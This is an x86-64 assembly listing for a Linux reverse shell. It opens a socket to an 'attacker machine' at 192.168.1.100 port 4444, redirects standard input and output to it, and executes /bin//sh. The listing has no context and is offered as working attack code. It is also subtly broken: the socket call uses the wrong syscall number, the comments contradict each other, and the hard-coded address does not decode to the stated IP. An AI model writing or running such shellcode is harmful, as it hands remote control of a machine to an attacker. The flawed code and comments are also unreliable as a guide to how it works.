global _start

section .data
    ; IP address of the attacker machine
    ip db 192, 168, 1, 100

    ; Port number to connect to
    port dw 4444

section .text
_start:
    ; Create a socket
    xor rax, rax                ; rax = 0
    xor rdi, rdi                ; rdi = 0
    push rdi                    ; protocol = 0
    push rdi                    ; SOCK_STREAM = 1
    push byte 2                 ; AF_INET = 2
    mov rsi, rsp                ; rsi points to the arguments array
    syscall

    ; Connect to the attacker machine
    mov rdi, rax                ; rdi = socket file descriptor
    mov rax, 1                  ; syscall number for sys_write
    push rax                    ; null-terminate the IP address
    push qword 0x0202a8c0       ; IP address in reverse order (192.168.1.100)
    mov rsi, rsp                ; rsi points to the IP address
    mov dx, word [port]         ; Port number (4444)
    push dx
    mov rdx, rsp                ; rdx points to the port number
    mov al, 41                  ; syscall number for sys_connect
    syscall

    ; Duplicate file descriptors for stdin, stdout, and stderr
    mov rdi, rax                ; rdi = socket file descriptor
    mov rax, 33                 ; syscall number for sys_dup2
    xor rsi, rsi                ; rsi = 0 (stdin)
    xor rdx, rdx                ; rdx = 0 (stdin)
    syscall

    inc rsi                     ; rsi = 1 (stdout)
    syscall

    inc rdx                     ; rdx = 2 (stderr)
    syscall

    ; Execute a shell
    xor rax, rax                ; rax = 0
    push rax                    ; null-terminate the string
    push 0x68732f2f6e69622f      ; "/bin//sh"
    mov rdi, rsp                ; rdi points to the string
    push rax                    ; null-terminate the argument list
    push rdi                    ; pointer to "/bin//sh"
    mov rsi, rsp                ; rsi points to the argument list
    mov al, 59                  ; syscall number for sys_execve
    syscall
